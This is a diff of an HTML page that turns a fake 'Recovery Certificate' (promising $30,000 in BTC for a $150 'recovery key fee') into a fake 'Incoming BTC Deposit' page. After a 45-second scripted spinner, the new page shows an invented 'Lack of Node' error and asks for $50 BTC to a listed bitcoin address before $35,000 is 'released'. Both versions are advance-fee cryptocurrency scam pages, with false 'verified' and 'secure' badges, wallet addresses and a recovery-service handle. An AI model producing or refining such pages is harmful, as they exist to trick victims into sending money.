@@ -1,289 +1,144 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Verified & Secure Recovery Certificate </title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Incoming BTC Deposit</title>
   <style>
-    :root{
-      --accent:#0f72ff;
-      --muted:#6b7280;
-      --green:#16a34a;
-      --gold:#f6c94d;
-      --bg:#ffffff;
-      --card-border:#eef2ff;
-      --card-shadow:0 18px 40px rgba(2,6,23,0.06);
-      --radius:14px;
-      --font-sans: "Inter", "Helvetica Neue", Arial, sans-serif;
-      --text:#0b1220;
-      --max-width:980px;
+    body {
+      margin: 0;
+      font-family: system-ui, sans-serif;
+      background: #0b0f14;
+      color: #eaf1f8;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
     }
 
-    *{box-sizing:border-box}
-    html,body{height:100%;margin:0;font-family:var(--font-sans);color:var(--text);-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;background:linear-gradient(180deg,#f7fbff 0%, #ffffff 100%);}
-
-    .wrap{min-height:100%;display:flex;align-items:center;justify-content:center;padding:48px 20px;}
-
-    .card{
-      width:100%;
-      max-width:var(--max-width);
-      background:var(--bg);
-      border-radius:var(--radius);
-      border:6px solid var(--card-border);
-      box-shadow:var(--card-shadow);
-      padding:34px 44px;
-      position:relative;
-      overflow:hidden;
+    .card {
+      background: #121820;
+      border: 1px solid #1b2430;
+      border-radius: 16px;
+      padding: 32px;
+      max-width: 480px;
+      text-align: center;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.35);
     }
 
-    /* Subtle watermark/seal */
-    .card::before{
-      content:"";
-      position:absolute;
-      right:-120px;
-      top:-120px;
-      width:380px;
-      height:380px;
-      background:radial-gradient(circle at 30% 30%, rgba(15,114,255,0.03) 0%, rgba(15,114,255,0.01) 30%, transparent 31%);
-      transform:rotate(18deg);
-      pointer-events:none;
+    h1 {
+      font-size: 22px;
+      margin-bottom: 16px;
+      color: #ffd36e;
     }
 
-    header.card-header{
-      display:flex;
-      align-items:center;
-      gap:20px;
-      justify-content:space-between;
-      flex-wrap:wrap;
-      border-bottom:1px solid #f3f6fb;
-      padding-bottom:18px;
-      margin-bottom:6px;
+    .amount {
+      font-size: 18px;
+      margin-bottom: 12px;
     }
 
-    .brand{display:flex;align-items:center;gap:12px;color:var(--accent);font-weight:700;letter-spacing:0.6px}
-    .brand .logo{width:44px;height:44px;display:inline-block;border-radius:8px;background:linear-gradient(135deg,#0f72ff 0%, #58a6ff 100%);box-shadow:0 6px 18px rgba(15,114,255,0.12);color:#fff;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:18px}
-    .brand-text{font-size:13px;color:var(--muted)}
-
-    .title-group{flex:1;min-width:260px;margin-left:8px}
-    h1{margin:0;font-size:20px;line-height:1.15}
-    .subtitle{margin:6px 0 0;color:var(--muted);font-size:13px}
-
-    .badges{display:flex;gap:10px;align-items:center}
-
-    .badge{
-      display:inline-flex;align-items:center;gap:8px;padding:8px 12px;border-radius:999px;font-weight:700;font-size:13px;background:#f3f9ff;color:var(--accent);
-      box-shadow:0 6px 18px rgba(15,114,255,0.04);
-    }
-    .badge--secure{background:#f2fff6;color:var(--green);box-shadow:0 6px 18px rgba(16,185,129,0.04)}
-    .badge svg{display:block}
-
-    .card-body{padding:22px 0 8px}
-
-    .amount-block{text-align:center;margin-bottom:18px}
-    .amount{font-weight:900;font-size:44px;letter-spacing:0.2px;color:var(--text)}
-    .currency{font-size:14px;font-weight:700;margin-left:8px;color:var(--muted)}
-    .amount-meta{color:var(--muted);font-weight:600;margin-top:6px;font-size:13px}
-
-    .main-grid{display:grid;grid-template-columns:1fr 420px;gap:20px;align-items:start}
-    @media (max-width:920px){ .main-grid{grid-template-columns:1fr} }
-
-    /* Left column */
-    .left-column{display:flex;flex-direction:column;gap:14px}
-
-    .receiver{background:#fbfdff;padding:16px;border-radius:10px;border:1px solid #f3f7ff}
-    .receiver-heading{margin:0 0 6px;font-size:13px;color:var(--muted)}
-    .receiver-value{margin:0;font-size:16px;font-weight:800;word-break:break-all}
-    .tx-ref{display:inline-block;margin-left:6px;background:#fff;padding:4px 8px;border-radius:6px;font-family:monospace;font-size:13px;border:1px solid #eef6ff;color:#0f1724}
-
-    .notes{padding:12px 14px;background:#fff;border-radius:10px;border:1px solid #fbfbfb;color:var(--muted);font-size:13px}
-
-    /* Right column: summary card */
-    .summary{
-      background:linear-gradient(180deg,#ffffff,#fbfdff);
-      border-radius:12px;
-      padding:18px;
-      border:1px solid #f3f7ff;
-      box-shadow:0 6px 18px rgba(2,6,23,0.03);
-    }
-    .summary h3{margin:0 0 6px;font-size:14px;color:var(--muted)}
-    .summary .summary-amount{font-size:28px;font-weight:900;color:var(--text);margin-bottom:6px}
-    .summary .small{font-size:13px;color:var(--muted);margin-bottom:12px}
-
-    .info-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin:0;padding:0}
-    .info{background:transparent;padding:12px;border-radius:8px;border:1px solid #fbfbfb}
-    .label{display:block;color:var(--muted);font-size:12px;margin-bottom:6px}
-    .value{font-size:14px;font-weight:800}
-
-    .value--success{color:var(--green)}
-    .value--danger{color:#dc2626}
-    .value--accent{color:var(--accent)}
-
-    .seal{
-      margin-top:14px;display:flex;gap:10px;align-items:center;justify-content:space-between;
-    }
-    .digital-seal{display:flex;gap:10px;align-items:center}
-    .seal .seal-badge{background:linear-gradient(180deg,#f3f9ff,#ffffff);padding:8px 12px;border-radius:10px;border:1px solid #eff8ff;font-weight:700;color:var(--accent);display:inline-flex;gap:8px;align-items:center}
-
-    /* Footer / signature */
-    footer.card-footer{display:flex;justify-content:space-between;align-items:center;gap:12px;margin-top:20px;padding-top:18px;border-top:1px dashed #eef4ff;flex-wrap:wrap}
-    .issuer{color:var(--muted);font-size:13px}
-    .issuer-name{font-weight:800;color:var(--text);margin-bottom:6px}
-    .signature{display:flex;flex-direction:column;align-items:flex-end}
-    .signature .signed{font-weight:800;color:var(--text)}
-    .signature .signed small{display:block;color:var(--muted);font-weight:600}
-
-    /* Print friendly */
-    @media print{
-      body{background:#fff}
-      .card{border:none;box-shadow:none;max-width:100%}
-      .badge{box-shadow:none}
+    .loader {
+      width: 80px;
+      height: 80px;
+      border: 8px solid rgba(255,255,255,0.1);
+      border-top: 8px solid #36a2ef;
+      border-radius: 50%;
+      margin: 24px auto;
+      animation: spin 1s linear infinite;
     }
 
-    /* small screens */
-    @media (max-width:520px){
-      .badge{padding:6px 10px;font-size:12px}
-      .summary{padding:14px}
-      .summary .summary-amount{font-size:22px}
-      .amount{font-size:34px}
+    @keyframes spin {
+      to { transform: rotate(360deg); }
     }
 
-    a{color:var(--accent);text-decoration:none}
-    dd, dt{margin:0}
+    .error {
+      display: none;
+      margin-top: 24px;
+      padding: 16px;
+      background: rgba(255,92,92,0.1);
+      border: 1px solid #ff5c5c;
+      border-radius: 12px;
+      color: #ff5c5c;
+    }
+
+    .battery {
+      margin: 16px auto;
+      width: 60px;
+      height: 28px;
+      border: 2px solid #ff5c5c;
+      border-radius: 6px;
+      position: relative;
+      background: #1b2430;
+    }
+
+    .battery::after {
+      content: "";
+      position: absolute;
+      top: 6px;
+      right: -10px;
+      width: 6px;
+      height: 16px;
+      background: #ff5c5c;
+      border-radius: 2px;
+    }
+
+    .battery-level {
+      width: 12%;
+      height: 100%;
+      background: #ff5c5c;
+    }
+
+    .wallets {
+      margin-top: 24px;
+      font-size: 14px;
+      text-align: left;
+    }
+
+    .wallets strong {
+      color: #ffd36e;
+    }
+
+    .note {
+      margin-top: 16px;
+      font-size: 13px;
+      color: #9fb3c8;
+    }
   </style>
 </head>
 <body>
-  <div class="wrap">
-    <article class="card" role="document" aria-label="Recovery Certificate — Verified & Secure">
-      <header class="card-header">
-        <div class="brand" aria-hidden="true">
-          <span class="logo" aria-hidden="true">RC</span>
-          <div>
-            <div style="font-weight:800;color:var(--text)">RECOVERY</div>
-            <div class="brand-text">Recovery Certificate</div>
-          </div>
-        </div>
+  <div class="card">
+    <h1>Incoming BTC Deposit</h1>
+    <div class="amount">Amount: <strong>$35,000 BTC</strong></div>
+    <div class="loader" id="loader"></div>
 
-        <div class="title-group" role="heading" aria-level="1">
-          <h1>Recovery Certificate</h1>
-          <p class="subtitle">Immediate recovery authorization — digitally verified and secure</p>
-        </div>
+    <div class="error" id="errorBox">
+      ⚠️ Incoming Deposit Error<br />
+      Reason: Lack of Node on Transaction Chain
+      <div class="battery">
+        <div class="battery-level"></div>
+      </div>
+      <div style="margin-top: 12px;">
+        To complete the transaction, please send <strong>$50 BTC</strong> to the address below.
+      </div>
+    </div>
 
-        <div class="badges" aria-hidden="false">
-          <div class="badge" title="Verified">
-            <!-- check icon -->
-            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" aria-hidden="true">
-              <path d="M20 6L9 17l-5-5" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" />
-            </svg>
-            VERIFIED
-          </div>
+    <div class="wallets" id="wallets" style="display:none;">
+      <div><strong>Receiving Address:</strong><br />3N53JAiXgDh9sWefMPr1pyhpcUADMWFHEi</div>
+      <div style="margin-top: 12px;"><strong>Verification Payment Address:</strong><br />bc1qkx2fcjg5ex4xdhnwyhtpjjh37ep0ndxt3x4fjk</div>
+    </div>
 
-          <div class="badge badge--secure" title="Secure & Encrypted">
-            <!-- lock icon -->
-            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" aria-hidden="true">
-              <rect x="3" y="11" width="18" height="10" rx="2" stroke="currentColor" stroke-width="1.6"/>
-              <path d="M7 11V8a5 5 0 0110 0v3" stroke="currentColor" stroke-width="1.6" stroke-linecap="round"/>
-            </svg>
-            SECURE
-          </div>
-        </div>
-      </header>
-
-      <section class="card-body" aria-labelledby="doc-title">
-        <div class="amount-block" aria-hidden="false">
-          <div class="amount" aria-label="Recovery amount">$30,000 <span class="currency">BTC</span></div>
-          <div class="amount-meta">Recovery Amount (currency: BTC) — Immediate release upon Recovery Key acquisition</div>
-        </div>
-
-        <div class="main-grid" role="group" aria-label="Certificate details">
-          <div class="left-column">
-            <div class="receiver" role="region" aria-label="Receiver details">
-              <h4 class="receiver-heading">Receiver</h4>
-              <p class="receiver-value">fst@simnet.is</p>
-              <p class="receiver-note" style="margin-top:10px;color:var(--muted);font-size:13px">
-                Transaction reference:
-                <span class="tx-ref">3N53JAiXgDh9sWefMPr1pyhpcUADMWFHEi</span>
-              </p>
-            </div>
-
-            <div class="notes" aria-hidden="false">
-              <strong style="display:block;margin-bottom:8px;color:var(--text)">Recovery Key Notice</strong>
-              <p style="margin:0 0 8px">A recovery key is required to complete immediate payment release. The recovery key is issued only after the fee below is received and verified. This document is digitally verified and logged for audit.</p>
-              <p style="margin:0;color:var(--muted);font-size:13px">For support contact: <a href="mailto:support@example.com">@coinstats_CryptoRecovey</a></p>
-            </div>
-          </div>
-
-          <aside class="summary" role="complementary" aria-label="Payment summary">
-            <h3>Payment Summary</h3>
-            <div class="summary-amount">$30,000 <span class="currency" style="font-size:13px;color:var(--muted);font-weight:700">BTC</span></div>
-            <div class="small">Recovery Key Fee required for immediate release</div>
-
-            <div style="margin-top:12px" class="info-grid" role="list" aria-label="quick info">
-              <div class="info" role="listitem">
-                <dt class="label">Status</dt>
-                <dd class="value value--success">Verified & Approved</dd>
-              </div>
-
-              <div class="info" role="listitem">
-                <dt class="label">Release Type</dt>
-                <dd class="value">Immediate Recovery Release</dd>
-              </div>
-
-              <div class="info" role="listitem">
-                <dt class="label">Currency / Network</dt>
-                <dd class="value">BTC (Bitcoin)</dd>
-              </div>
-
-              <div class="info" role="listitem">
-                <dt class="label">Recovery Key Fee</dt>
-                <dd class="value value--accent">$150 <span style="font-size:12px;color:var(--muted)">BTC</span></dd>
-              </div>
-
-              <div class="info" role="listitem">
-                <dt class="label">Issued On</dt>
-                <dd class="value">2025-11-22</dd>
-              </div>
-
-              <div class="info" role="listitem">
-                <dt class="label">Certificate ID</dt>
-                <dd class="value">RC-20251122-001</dd>
-              </div>
-            </div>
-
-            <div class="seal" aria-hidden="true">
-              <div class="digital-seal">
-                <div class="seal-badge">
-                  <!-- shield icon -->
-                  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true">
-                    <path d="M12 2l7 3v5c0 5.5-3.8 10.7-7 12-3.2-1.3-7-6.5-7-12V5l7-3z" stroke="currentColor" stroke-width="1.2" fill="none"/>
-                    <path d="M9.5 12.5l1.8 1.8 3.7-3.7" stroke="currentColor" stroke-width="1.4" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
-                  </svg>
-                  DIGITALLY SEALED
-                </div>
-
-                <div style="font-size:12px;color:var(--muted)">Blockchain Ledger: Verified</div>
-              </div>
-
-              <div style="text-align:right">
-                <div style="font-size:12px;color:var(--muted)">Verification:</div>
-                <div style="font-weight:800;color:var(--accent)">Signature ID: S-9f3a2b</div>
-              </div>
-            </div>
-          </aside>
-        </div>
-      </section>
-
-      <footer class="card-footer" role="contentinfo">
-        <div class="issuer" aria-label="Issuer details">
-          <div class="issuer-name">Issuer: Recovery Operations</div>
-          <div style="font-size:13px;color:var(--muted)">@coinstats_CryptoRecovey</div>
-        </div>
-
-        <div class="signature" aria-hidden="false">
-          <div class="signed"> signed</div>
-          <small style="color:var(--muted)">This certificate is issued and verified using secure cryptographic standards.</small>
-        </div>
-      </footer>
-    </article>
+    <div class="note" id="note" style="display:none;">
+      Once the $50 BTC is confirmed, the $35,000 BTC will be released to your wallet within 5–15 minutes (average BTC processing time).
+    </div>
   </div>
+
+  <script>
+    setTimeout(() => {
+      document.getElementById('loader').style.display = 'none';
+      document.getElementById('errorBox').style.display = 'block';
+      document.getElementById('wallets').style.display = 'block';
+      document.getElementById('note').style.display = 'block';
+    }, 45000); // 45 seconds
+  </script>
 </body>
 </html>
